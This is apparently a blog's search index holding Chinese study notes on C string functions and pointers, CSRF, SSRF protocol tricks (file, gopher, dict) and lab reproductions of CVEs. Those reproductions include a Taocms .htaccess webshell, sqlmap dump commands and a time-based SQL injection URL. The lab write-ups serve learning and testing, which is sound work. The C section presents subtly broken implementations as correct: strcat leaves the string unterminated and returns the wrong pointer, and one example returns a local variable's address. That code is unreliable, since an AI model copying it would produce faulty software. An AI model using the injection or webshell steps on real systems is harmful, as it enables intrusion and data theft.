字符串长度函数:\n\nunsigned strlen(char *str);\n\n- 字符串连接函数:\n\nchar *strcat(char *strdest , char *strsrc);\n\n- 字符串复制函数\n\nchar *strcpy(char *strdest,char *strsrc);\n\n- 字符串比较函数\n\nint strcmp(char *str1, char *str2);\n\n- 字符串转小写函数\n\nchar *strlwr(char *str);\n\n- 字符串转大写函数\n\nchar *strupr(char *str);\n\n然后我们就开始试着编写一下上面几个函数的实现\n\n### strlen()函数的定义\n\n```c\n/*strlen函数的定义\n实现功能:传入一个字符串返回字符串的长度\n*/\nunsigned strlen(char *str){\n\tunsigned int len = 0;\n\twhile(*str != '\\0'){\n\t\tstr++;\n\t\tlen ++;\n\t}\n\treturn len;\n}\n```\n\n### strcat()函数的定义\n\n```c\n/*字符串连接函数\n实现功能: 把 src 所指向的字符串追加到 dest 所指向的字符串的结尾。\n*/\nchar *strcat(char *strdest, char *strsrc){\n\twhile(*strdest != '\\0'){\n\t\tstrdest++;\n\t}\n\twhile(*strsrc != '\\0'){\n\t\t*strdest = *strsrc;\n\t\tstrdest++;\n\t\tstrsrc++;\n\t}\n\treturn strdest;\n} \n```\n\n不过根据地址传递的方式，我觉得这里用函数返回值类型void类型也是可以的，毕竟不需要返回值\n\n```c\n#include <stdio.h>\n\nvoid *strcat(char *strdest, char *strsrc){\n\twhile(*strdest != '\\0'){\n\t\tstrdest++;\n\t}\n\twhile(*strsrc != '\\0'){\n\t\t*strdest = *strsrc;\n\t\tstrdest++;\n\t\tstrsrc++;\n\t}\n\t//return strdest;\n} \n\nint main() {\n    char dest[50] = \"Hello, \";\n    char src[] = \"world!\";\n\n    strcat(dest, src); // 将src追加到dest的末尾\n\n    printf(\"Concatenated string: %s\\n\", dest); // 输出：Hello, world!\n\n    return 0;\n}\n//Concatenated string: Hello, world!\n```\n\n### strcpy()函数的定义\n\n```c\n/*字符复制函数\n实现功能: 把 src 所指向的字符串复制到 dest。\n*/\nchar *strcpy(char *strdest,char *strsrc){\n\twhile(*strdest++ = *strsrc++);\n\treturn strdest;\n}\n```\n\n### strcmp()函数的定义\n\n```c\n/*比较函数\n实现功能:函数strcmp从头至尾顺序地将其对应字符比较，遇到两个字符不等时，两个字符相减得到一个int型值，两个字符串完全相同时，则返回0。  \n*/\n\n```\n\n## 指针和函数\n\n指针可以指向变量，同样也可以指向一个函数，如果使用一个指针指向一个函数的话那我们就可以通过指针来调用其所指向的函数\n\n### 指向函数的指针\n\n**函数指针**:在C语言中，一个函数总是占用一段连续的空间，而函数名就是该函数所占内存空间的首地址。任何一个函数在编译的时候都会被分配一个入口地址即函数的首地址。如果我们把这个首地址赋予给一个指针变量，此时该指针就指向这个函数，通常把指向函数的指针称为函数指针\n\n利用函数指针可以实现对函数的调用，从而转入该函数的入口地址，执行此函数。\n\n### 利用函数指针调用函数的步骤\n\n- 定义指向函数的指针变量\n\n定义格式\n\n```\n数据类型 (*指针变量名)();\n例如:\nint (*func)();\n数据类型表示被指向函数的返回值类型\n```\n\n- 将指针变量指向某函数\n\n函数指针定义后并不指向任何函数，需要我们将函数的入口地址赋予该指针，入口地址就是函数名\n\n赋值格式\n\n```c\n指针变量名 = 函数名;\n例如:\nint func(int x, int y){\n\t//函数体\n}\nint main(){\n\tint (*p)();\n\tp = func;\n    \n    return 0;\n}\n```\n\n- 利用函数指针调用函数\n\n格式\n\n```c\n(*函数指针名)(实参列表);\n例如:\n(*p)(a,b);\n```\n\n我们实操一个例子\n\n```c\n#include <stdio.h>\nint max(int x, int y){\n\treturn x > y ? x : y;\n}\nint main(){\n\tint a = 0,b = 0,c = 0,maxnum = 0;\n\tint (*p)(int,int) = max;\n//\tint (*p)(int,int) = &max;这里&可以省略 \n\tprintf(\"输入需要比大小的三个整数(每个数直接以空格分割):\\n\");\n\tscanf(\"%d %d %d\",&a,&b,&c);\n\tmaxnum = p(p(a,b),c);//函数嵌套调用\n\tprintf(\"最大的数字是:%d\",maxnum);\n\treturn 0;\n}\n```\n\n这里的话写了一个比大小的函数，然后让函数指针指向这个函数，并通过函数指针去调用函数\n\n### 函数指针作为函数参数\n\n在C语言中，函数指针并不单单只是简单的进行上面的调用，而是主要用来实现函数之间传递函数，这种传递并不是数据或者变量的地址，而是传递函数的入口地址，那么怎么去实现呢？\n\n我们可以知道，函数的参数可以是变量，常量，指向普通变量的指针变量，数组名，指向数组的指针等等，那么后面还会有一个指向函数的指针我们来学习一下。\n\n说的简单点就是函数的嵌套使用，我们在函数调用的时候把某个函数的入口地址传递给被调函数，使得我们传递的函数在被调函数中调用，以达到意想不到的效果。\n\n先写个简单的例子\n\n```c\n#include <Stdio.h>\nint max(int a,int b){\n\tint c;\n\t//函数体\n\treturn c; \n}\nint min(int a,int b){\n\tint c;\n\t//函数体 \n\treturn c; \n}\nint common(int (*p1)(),int (*p2)()){\n\t//函数体 \n\tint y1,y2;\n\ty1 = (*p1)(2,4);\n\ty2 = (*p2)(2,3);\n\treturn y1+y2; \n}\nint main(){\n\tint (*p1)(),(*p2)();\n\tint c=0;\n\tp1 = max ; \n\tp2 = min ; \n\tc = common(p1,p2);\n\treturn 0;\n}\n```\n\n功能还是很简单的，common函数有两个参数，这两个参数定义为函数指针，然后还有max函数和min函数，这两个函数的入口地址分别用p1和p2指向，然后将p1和p2传入common中，在common中调用p1，p2指向的函数\n\n这个在common中的函数指针指向的函数就是回调函数\n\n- 回调函数\n\n函数指针变量可以作为某个函数的参数来使用的，回调函数就是一个通过函数指针调用的函数。\n\n### 返回指针的函数\n\n一样的，只不过返回指针的函数返回值一定是一个地址\n\n格式\n\n```c\n返回值类型 *函数名(参数列表){\n\t//函数体\n\treturn 地址或指针变量;\n}\n例如：\nint *func(int x,int y){\n\tint c;\n\t//函数体\n\treturn &c;//返回c的地址\n}\n```\n\n这里需要注意的是，在`*func`两侧并没有括号，\n\n# 结构体与共用体\n\n快考试啦，感觉这里考的内容不多，所以写的就不会很深刻\n\n之前我们讲过当处理一组相同数据类型的元素的时候，我们会用数组去进行处理，但是如果是一组不同数据类型的数显然就不能使用数组去做了，这时候我们就可以用结构体\n\n- 之前在数据类型里讲过，数组是构造类型，而结构体同样也是构造类型\n- 数组的数组元素都是通过下标去进行访问的，而结构体是通过成员名字去进行引用的，就很像我们php里面的实例化对象的成员属性和成员方法的引用\n\n## 结构体\n\n### 结构体类型的定义\n\n格式\n\n```c\nstruct 结构体名\n{\n    类型1 变量1;\n    类型2 变量2;\n    类型3 变量3;\n    ...\n    类型n 变量n;\n};注意分号\n例如\nstruct students\n{\n\tint age;\n    double heigh;\n    char sex;\n    char a[]\n\tchar *name;\n};\n```\n\n在结构体中的成员都必须声明好数据类型，结构体名和变量名都应该符合标识符的命名规则，成员名和程序中其他的变量名并不冲突\n\n### 结构体变量的定义\n\n上面讲的只是结构体的定义，而那个结构体名并不是结构体变量的名字，在定义结构体变量的时候就和正常的定义变量是一样的\n\n定义的方法：\n\n- 先定义结构体类型，再定义结构体变量\n\n格式\n\n```c\nstruct 结构体名\n{\n    类型1 变量1;\n    类型2 变量2;\n    类型3 变量3;\n    ...\n    类型n 变量n;\n};注意分号\nstruct 结构体名 变量名1，变量名2...;\n```\n\n这里的话其实把这个结构体名当成就是我们平时的int这种基本数据类型就行了\n\n当然我们也可以在程序开头用宏定义的方法去定义一个结构体类型\n\n```c\n#define STU struct 结构体名\n{\n    类型1 变量1;\n    类型2 变量2;\n    类型3 变量3;\n    ...\n    类型n 变量n;\n};注意分号\nstruct 结构体名 变量名1，变量名2...;//\n或者直接进行初始化\nstruct 结构体名 变量名1 = {成员1的值，成员2的值...};\n```\n\n- 在定义结构体类型的同时去定义结构体变量\n\n```c\nstruct 结构体名\n{\n    类型1 变量1;\n    类型2 变量2;\n    类型3 变量3;\n    ...\n    类型n 变量n;\n}结构体变量名1，结构体变量名2...;\n```\n\n- 直接定义结构体变量\n\n```c\nstruct \n{\n    类型1 变量1;\n    类型2 变量2;\n    类型3 变量3;\n    ...\n    类型n 变量n;\n}结构体变量名1，结构体变量名2...;\n```\n\n- 定义的时候进行初始化赋值\n\n```\nstruct \n{\n    类型1 变量1;\n    类型2 变量2;\n    类型3 变量3;\n    ...\n    类型n 变量n;\n}结构体变量名1={成员1的值,成员2的值...};\n```\n\n以上的方法都是可以的，其实在整个定义的过程中，我们只需要记住，结构体名，结构体变量名，成员变量名三者至少要出现两个。\n\n- 嵌套的结构体定义\n\n简单来说就是成员的类型可以是结构体变量，但这里要注意不是结构体类型而是具体的结构体变量，所以例如下面的写法是错误的\n\n```c\nstruct 结构体名\n{\n    struct 结构体名;\n}\n正确的是\nstruct 结构体名\n{\n    struct 结构体名 变量名;\n}\n```\n\n### 结构体类型的基本操作\n\n- 引用结构体变量的成员\n\n当我们定义了一个结构体类型且定义了一个结构体变量后，就可以对结构体变量中的成员变量进行操作了，其实就跟PHP中的访问成员变量是一样的，只不过符号不一样，这里是用圆点符号(`.`)成员运算符\n\n格式\n\n```c\n结构体变量名.成员名\n例如\nstudent.name = \"wanth3f1ag\";\n```\n\n另外还可以对成员的值进行打印输出或者通过键盘去赋值\n\n- 结构体中嵌套成员的访问\n\n这种情况适用于我们的结构体是嵌套结构体类型时，例如我们的student结构体里面嵌套着student1结构体变量，那我们的访问就是逐级访问，通过成员运算符从最高级开始依次递进到最后一级成员为止\n\n```c\nstudent.student1.name = \"wanth3f1ag\";\n```\n\n- 同类型的结构体变量之间可直接赋值\n\n```c\nstudent1 = student2;\n```\n\n- 不允许直接将结构体变量输出\n\n和数组的原理一样，我们直接输出数组的数组元素的值，而不能直接输出数组\n\n## 结构体和数组\n\n在上面我们就介绍了一个结构体变量只能存放一个对象的一组相关数据，这对有些复杂的操作例如统计全班同学的情况这种操作并不方便，所以这时候我们就需要用结构体数组，即数组中每个数组元素都是结构体变量\n\n结构体数组的每个元素都是具有相同结构类型的下标结构变量\n\n### 结构体数组的定义\n\n- 先定义结构体类型，再定义结构体数组\n\n```\nstruct 结构体名\n{\n    类型1 变量1;\n    类型2 变量2;\n    类型3 变量3;\n    ...\n    类型n 变量n;\n};注意分号\nstruct 结构体名 结构体数组名\n例如\nstruct students\n{\n\tint age;\n\tchar *name;\n};\nstruct students std[50];//设置一个有50个元素的数组去存放全班50个人的资料\n```\n\n- 在定义结构体类型的同时去定义结构体变量\n\n```\nstruct students\n{\n\tint age;\n\tchar *name;\n} std[50];\n```\n\n","tags":["C语言复习记录"],"categories":["C语言"]},{"title":"CSRF的一点点学习","url":"/2025/02/17/CSRF的一点点学习/","content":"\n# 0x01前言\n\n因为刷ctfshow的时候没有专门的板块是关于CSRF的，所以这方面的知识一直只是停留在一个浅层，今天做题碰到一个CSRF的题目，刚好赶紧来学习一下\n\n# 0x02正文\n\n参考文章:\n\n[CSRF 攻击详解](https://www.cnblogs.com/54chensongxia/p/11693666.html)\n\n[CSRF详解](https://juejin.cn/post/7008171429845811207)\n\n[csrf漏洞详解](https://blog.csdn.net/2301_80661529/article/details/136383899)\n\n## 什么是CSRF？\n\nCSRF（Cross-Site Request Forgery）的全称是“跨站请求伪造”，通过**伪装**来自受信任用户的请求来攻击受信任的网站。和SSRF(服务器端请求伪造)不同的是，CSRF说的简单点就是钓鱼，是`攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的`。\n\nCSRF攻击其实是利用了web中用户身份认证验证的一个漏洞：简单的身份验证仅仅能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。就比如坏人捡到你丢失的手机，然后用你的手机像你父母发送诈骗短信去进行骗钱\n\n接下来我们用师傅的图来进行讲解一下\n\n## CSRF攻击的流程\n\n![攻击流程](../image/achieve/202411/CSRF/1775037-20191017175510255-586760342.png)\n\n由图就可以看到CSRF攻击的流程\n\n1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；\n2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；\n3. 用户**未退出网站A之前**，在同一浏览器中，打开一个TAB页访问网站B；\n4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；\n5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。\n\n## CSRF攻击的条件\n\n1.需要登录信任网站，且产生cookie给浏览器\n\n2.在不登出信任网站的情况下，访问或被诱导访问有害网站。\n\n3.CSRF攻击者通过构建一个恶意网页或邮件中的链接，其中包含了对信任网站的请求（如转账、删除账户等敏感操作）。\n\n总而言之就是用户在不知情的情况下访问了这个恶意网页或点击了邮件中的链接，浏览器会自动带上用户的session cookie向信任网站发起请求。信任网站收到请求后，由于请求中携带有有效的session token，服务器误以为这是用户的真实意图，进而执行了请求中的恶意操作。\n\n## CSRF攻击的危害\n\n- 账户操作篡改：\n\n\n攻击者可以假冒用户身份执行高权限操作，例如：转账、更改密码、删除账户、购买商品等，造成用户的财产损失或个人信息泄露。\n\n- 个人隐私泄露：\n\n如果网站中有涉及个人隐私的功能接口存在CSRF漏洞，攻击者可能借此窃取用户的私人数据，如联系人列表、聊天记录、财务信息等。\n\n- 账户劫持：\n\n利用CSRF漏洞更改用户的账户设置，包括电子邮件地址、密保问题答案等，为进一步接管账户奠定基础。\n\n- 社交网络蠕虫传播：\n\n如前面提到的案例，如果社交网络平台的部分接口存在CSRF漏洞，攻击者可以制作CSRF蠕虫，通过链式反应迅速扩大攻击范围，例如：自动向用户的好友发送包含恶意链接的消息。\n\n- 系统级攻击：\n\n对于企业级应用或者物联网设备，CSRF漏洞可能导致系统级控制命令的非法执行，如改变路由器配置、控制系统设备行为等。\n\n- 组合攻击：\n\nCSRF攻击可以与其他漏洞结合，形成组合拳，比如与XSS（跨站脚本攻击）结合，进一步提升攻击成功率和复杂度。\n\n","tags":["CSRF"],"categories":["CSRF"]},{"title":"SSRF的一些学习","url":"/2025/02/07/SSRF的一些学习/","content":"\n# 0x01前言\n\n一腔热血，心血来潮想把之前没学的ssrf的一些知识点学了，也算是搁置了好久才拿起来学的了\n\n# 0x02基础知识\n\n![img](../image/achieve/202411/SSRF/20191206123722.png)\n\n图片来源:[SSRF|Atmujie](https://atmujie.github.io/2021/09/22/SSRF/)\n\n参考文章:\n\n[SSRF-CTF Wiki](https://ctf-wiki.org/web/ssrf/)\n\n[狼组安全团队公知识库](https://wiki.wgpsec.org/knowledge/web/csrf-ssrf.html)\n\n虽然说是介绍一些协议和payload的打法，但基础知识我还是搬过来了，免得看文章的时候反复翻来翻去的看\n\n## 1.SSRF漏洞简介：\n\nSSRF全称：Server-Side Request Forgery，即，服务器端请求伪造。是一个**由攻击者构造请求**，**在目标服务端执行**的一个安全漏洞。攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，目标通常是从外网无法访问的内部系统。简单来说就是**利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所能访问到的内网进行攻击**。也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，**当作跳板**进行攻击。\n\n## 2.主要的攻击方式\n\n当攻击者想要访问服务器B上的服务，但是由于存在防火墙或者服务器B是属于内网主机等原因导致攻击者无法直接访问。如果服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，达到攻击内网的目的。**此时A被作为中间人（跳板）进行利用。**\n\n![img](../image/achieve/202411/SSRF/291ec601e211cc73dc1223d9a52f7882.jpg)\n\n## 3.漏洞形成成因\n\nSSRF漏洞形成的原因大都是由于**服务端提供了从其他服务器获取数据的功能但没有对目标地址做过滤与限制**。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。\n\n## 4.存在漏洞的地方\n\n- 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞\n- 从远程服务器请求资源（Upload from URL，Import & Export RSS Feed）\n- 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）\n- Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）\n- 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）\n\n## 5.SSRF漏洞的检测方法\n\n- 抓包分析发送的请求是否是由服务器发送的\n- 从页面源码中查找访问的资源地址\n\n## 6.相关的类和方法\n\n- `file_get_contents`\n\n```php\n<?php\n    if(isset($_POST['url'])){\n        $content = file_get_contents($_POST['url']);\n        $filename = './images/'.rand().';img1.jpg';\n        echo $_POST['url'];\n        $img = \"<img src=\\\"\".$filename.\"\\\"/>\";\n    }\n\techo $img;\n?>\n```\n\n这段 PHP 代码的目的是接收用户通过 POST 请求发送的 URL，并尝试从该 URL 获取内容，最后生成一个 HTML `<img>` 标签来显示一张图片。\n\n- `fsockopen()`\n\n`fsockopen()` 是 PHP 中的一个函数，用于打开一个网络连接（套接字）到指定的主机和端口。\n\n```php\n<?php \nfunction GetFile($host,$port,$link) { \n    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); \n    if (!$fp) { \n        echo \"$errstr (error number $errno) \\n\"; \n    } else { \n        $out = \"GET $link HTTP/1.1\\r\\n\"; \n        $out .= \"Host: $host\\r\\n\"; \n        $out .= \"Connection: Close\\r\\n\\r\\n\"; \n        $out .= \"\\r\\n\"; \n        fwrite($fp, $out); \n        $contents=''; \n        while (!feof($fp)) { \n            $contents.= fgets($fp, 1024); \n        } \n        fclose($fp); \n        return $contents; \n    } \n}\n?>\n```\n\n这段代码使用 `fsockopen` 函数实现获取用户指定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。\n\n![image-20241201204741829](../image/achieve/202411/新春欢乐赛/image-20241201204741829.png)\n\n## 8.相关的伪协议\n\n- file 协议结合目录遍历读取文件。\n- gopher 协议打开端口。\n- dict 协议主要用于结合 curl 攻击。\n- http 协议进行内网探测。\n\n讲到了伪协议，我们接下来就是对这些伪协议的讲解了\n\n# 0x03协议\n\n首先最常用的就是我们的file协议了\n\n## file协议\n\nFIle协议也叫**本地文件传输协议** ，主要用于访问本地计算机中的文件，与 HTTP、HTTPS、FTP 等协议不同，`file:///` 主要用于指向计算机上的本地文件，而不是远程服务器上的资源。\n\n### file协议的基本格式\n\n```\nfile:///文件路径\n```\n\n例如我们如果需要读取D盘下txt目录的index.txt文件，那我们就可以通过`file:///D:/index.txt`去进行文件读取\n\n假设我们的站点测出来存在ssrf的话，我们可以先通过例如我们最常见的`file:///etc/passwd`去获取本地的文件信息，它是用于读取Linux系统上的passwd文件，**passwd文件是Linux系统中用于存储用户账户信息的文件**，其中包含了所有用户的用户名、密码和相关配置信息。然后`file:///etc/hosts`去获取本机内网ip信息\n\n权限高的情况下还可以尝试读取 `/proc/net/arp` 或者 `/etc/network/interfaces` 来判断当前机器的网络情况\n\n所以SSRF通常情况下都会造成任意文件读取的危害\n\n这里我之前一直有疑问就是为什么file:///是三个斜杠\n\n首先我们先说什么是URI\n\n## URI是什么\n\nURI（统一资源标识符，Uniform Resource Identifier）是一种用于标识资源的字符串，它可以是一个 URL（统一资源定位符，Uniform Resource Locator），也可以是一个 URN（统一资源名称，Uniform Resource Name）。\n\nURI的结构\n\n```\nscheme:[//[user:password@]host[:port]][/]path[?query][#fragment]\n```\n\n- 第一个就是协议部分(scheme)，通常常见的就是我们的http,https协议\n- 第二个就是authority部分(可选)，通常包括host主机名(或者IP地址)和port可选端口，或者有时候会跟上用户名和密码，例如`username:password@`。\n- 第三个就是path部分，通常以/斜杠开头，指向一个资源路径，如/path/to/resource。\n- 第四个就是query部分，即查询字符串，也就是我们的传参的参数部分，通常以?问号开头后面跟着参数对，参数之间用&分开。例如?username=admin&password=123456\n- 第五个就是fragment部分，用于指向资源的某一部分\n\n所以通常我们的URI都是会以三个斜杠来指向一个特定的资源或者地址的，例如我们自己本地web应用中的index.php文件那么写法就是`http://127.0.0.1/index.php`\n\n- 浏览器通过file://访问文件和http://访问文件的区别\n\nfile协议用于访问本地计算机中的文件，好比通过资源管理器中打开文件一样，需要主要的是它是针对本地的，即file协议是**访问你本机的文件资源。**\n\nhttp访问本地的html文件，相当于**将本机作为了一台http服务器，然后通过localhost访问的是你自己电脑上的本地服务器，再通过http服务器去访问你本机的文件资源。**\n\n再简单点就是file只是简单请求了本地文件，将其作为一个服务器未解析的静态文件打开。而http是在本地搭建了一个服务器再通过服务器去动态解析拿到文件。\n\n## Gopher协议\n\n**`Gopher`**协议是一种通信协议，**用于在Internet 协议网络中分发、搜索和检索文档**。\n\n他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。\n\n### Gopher协议格式\n\n```\ngopher://<host>:<port>/<gopher-path>_<TCP数据流>\n```\n\n很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了\n\n在利用协议进行传参请求以及传递多个参数时需要注意\n\n- 发起POST请求时，多个请求每个请求需要用回车换行需要使用`%0d%0a`代替，结尾也要加上`%0d%0a`\n- 参数之间的`&`需要进行URL编码\n- 参数以`_`开头 ，否则第一个字符会被吞掉\n\n### 支持Gopher协议的环境\n\n- `PHP —write-curlwrappers且PHP版本至少为5.3`\n- `Java 小于JDK1.7`\n- `Curl 低版本不支持`\n- `Perl 支持`\n- `ASP.NET 小于版本3`\n\n注意在使用gopher发送请求的时候需要将构造好的的请求包的内容全部url编码后再进行发送\n\n如果这里使用的是`curl`命令（比如在命令行curl + gopher）url编码一次即可。如果是web端的参数有ssrf，需要url编码两次才可以打进去\n\n![image-20211022123436051](../image/achieve/202411/新春欢乐赛/image-20211022123436051.png)\n\n![image-20211022123450214](../image/achieve/202411/SSRF/image-20211022123450214.png)\n\n### 为什么我们的SSRF中常配合Gopher协议？\n\n以redis产生的SSRF为例，由于Gopher传输的数据是没有任何额外数据的，这样的好处非常的明显，**在我们请求6379端口时，除了我们构造的redis格式的数据外，将不会产生任何Redis无法识别的额外数据，从而可以保证Redis顺利执行我们构造的语句，很显然HTTP做不到这一点。**关于打redis的内容我在讲完dict协议后会进行详细讲解\n\n所以这也提醒了我们，`Gopher`协议除了应用于攻击内网的`Redis`服务器，还有FTP等等服务器也可以尝试，而且拓展来看`Gopher`协议甚至可以用来写入一句话。\n\n## dict协议\n\nDICT 协议（Dictionary Protocol）是一种用于在线字典和词典服务的网络协议。它允许用户通过客户端访问和查询远程字典服务器。Dict服务器和客户机使用TCP端口2628。\n\n**dict协议功能：**\n\n**利用dict协议可以探测端口的开放情况和指纹信息**，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口\n\ndict协议格式\n\n```\ndict://serverip:port/命令:参数\n```\n\n具体怎么实现探测端口呢?\n\n我们可以用bp进行抓包，抓包后利用dict协议进行访问端口，同样的我们可以利用intruder爆破模块去对端口进行爆破\n\n抓包将端口那设为要爆破的参数\n\n![image-20201223173904530](../image/achieve/202411/SSRF/1835657-20201230235414093-1882268458.png)\n\n然后用纯数字爆破或者利用端口字典进行爆破，爆破结束后查看回显内容就可以了\n\ndict协议除了可以探测端口以外，还可以进行命令执行，dict协议后跟的命令可以直接被某些服务执行，比如redis\n\n# 0x04SSRF打穿内网\n\n这里本来想搭建国光师傅的靶场的，但是不会搭内网的靶场，只能先看着来学了，后面有机会再重新搭起来打一次\n\n![img](../image/achieve/202411/SSRF/16205694239190.png)\n\n从图中不难看出，**例如有一个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 8080，此时攻击者通过这个 8080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击**而且可以攻击的方式也是特别多的，所以才能做到打穿内网的程度。\n\n## 1.SSRF是否存在的测试\n\n\n\n## 1.SSRf获取本地信息\n\n","tags":["SSRF服务器请求伪造"],"categories":["SSRF"]},{"title":"春秋CVE刷题学习","url":"/2025/02/05/春秋CVE刷题学习/","content":"\n## CVE-2022-25578\n\n### #RCE\n\n![image-20250206000349335](../image/achieve/202411/春秋云镜/image-20250206000349335.png)\n\nCVE-2022-25578是Taocms v3.0.2中存在的一个安全漏洞，该漏洞允许攻击者通过任意编辑.htaccess文件来执行代码注入攻击。\n\n### Taocms\n\ntaoCMS是一个完善支持多数据库(Sqlite/Mysql)的CMS网站内容管理系统，是国内最小的功能完善 的基于php+SQLite/Mysql的CMS。体积小（仅180Kb）速度快，包含文件管理、数据采集、Memcache整 合、用户管理等强大功能，跨平台运行，支持SAE、BAE云服务。兼容PHP5和PHP7.代码手写采用严格的数据过滤，保证 服务器的安全稳定！\n\n打开靶机\n\n![image-20250206000451437](../image/achieve/202411/春秋云镜/image-20250206000451437.png)\n\n提示先去后台设置，在底下发现管理按键，打开是登录界面，弱口令密码admin&tao成功登录\n\n![image-20250206000929016](../image/achieve/202411/春秋云镜/image-20250206000929016.png)\n\n在文件管理页面拿到路径的文件及其文件内容,我们进入.htaccess文件\n\n### .htaccess文件\n\n参考文章:[与 .htaccess 相关的奇淫技巧](https://www.anquanke.com/post/id/241147#h2-10)\n\n.htaccess 文件是Apache中有一种特殊的文件，其提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一条或多条指令的文件，以作用于此目录及其所有子目录。\n\n作用范围：\n\n.htaccess 文件中的配置指令作用于 .htaccess 文件所在的**目录及其所有子目录**，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。\n\n### .htaccess 常见指令\n\n**AddType 指令**\n\n```\nAddType application/x-httpd-php .jpeg .png\n```\n\n**AddType 指令可以将给定的文件扩展名映射到指定的内容类型。**\n\n这个指令的主要作用是文件上传时候如果我们上传一个后缀为png或者jpeg的文件，当它们被访问时，应该用PHP解析器来解析。意味着我们可以通过在这些后缀的文件中插入恶意php代码去达到我们的进攻目的\n\n- 防范:如果你发现你的.htaccess文件被修改了，你应该检查文件的修改日期和所有者，以确保它没有被未经授权的访问者更改。如果可能的话，你应该备份你的.htaccess文件，并定期检查它的内容，以确保它没有被修改。\n\n或者也可以这样设置\n\n**SetHandler指令**\n\n```\nSetHandler application/x-httpd-php\n```\n\n**SetHandler 指令可以强制所有匹配的文件被一个指定的处理器处理。**\n\n这个指令的主要作用是告诉 Apache，任何匹配的文件都应该通过 PHP 处理器来处理。当前目录及其子目录下所有文件都会被当做 php 解析。\n\n然后我们找个php文件去编写我们的一句话木马，我这里找了api.php去写入一句话木马，写完后访问/api.php然后用蚁剑去连接就可以了\n\n## CVE-2022-32991\n\n### #SQL注入\n\n![image-20250206004129218](../image/achieve/202411/春秋云镜/image-20250206004129218.png)\n\n漏洞信息\n\n|  漏洞名称  |          Web Based Quiz System SQL注入           |\n| :--------: | :----------------------------------------------: |\n|  漏洞编号  |                  CVE-2022-32991                  |\n|  危害等级  |                       高危                       |\n|  漏洞类型  |                     SQL注入                      |\n|  漏洞厂商  |                        -                         |\n|  漏洞组件  |              Web Based Quiz System               |\n| 受影响版本 | Web Based Quiz System Web Based Quiz System V1.0 |\n\n漏洞概述 : Web Based Quiz System v1.0版本存在SQL注入漏洞，该漏洞源于welcome.php中的eid参数缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令窃取数据库敏感数据。\n\n开始复现\n\n登录界面随便注册一个账号后登入\n\n![image-20250206004644473](../image/achieve/202411/春秋云镜/image-20250206004644473.png)\n\n进入之后我们观察url，发现我们此时就在welcome.php，并且url后面跟着一个参数q，随便点击一个start看到出现了很多参数\n\n```\nhttp://eci-2ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34\n```\n\n直接拖到sqlmap里面测试一下注入点\n\n```\npython3 sqlmap.py -u 'http://eci-2ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34'\n```\n\n![image-20250206010047702](../image/achieve/202411/春秋云镜/image-20250206010047702.png)\n\n后面直接一把梭就行\n\n```\npython3 sqlmap.py -u 'http://eci-2ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34' -D ctf -T flag -C flag --dump --batch\n```\n\n等待的同时我们也可以手工测一下发现是时间盲注\n\n```\nhttp://eci-2ze3jxvbttwrc7antdrn.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694' or sleep(0.3)--+&n=1&t=34\n```\n\n一开始选的时间太大导致睡死了，后面调到0.3的话差不多6s左右\n\n## CVE-2022-28512\n\n### #SQL联合注入\n\nFantastic Blog (CMS)是一个绝对出色的博客/文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的/single.php路径下，id参数存在一个SQL注入漏洞。\n\n- 影响版本\n\nFantastic Blog CMS 1.0 版本\n\n开始复现\n\n打开是Fantastic 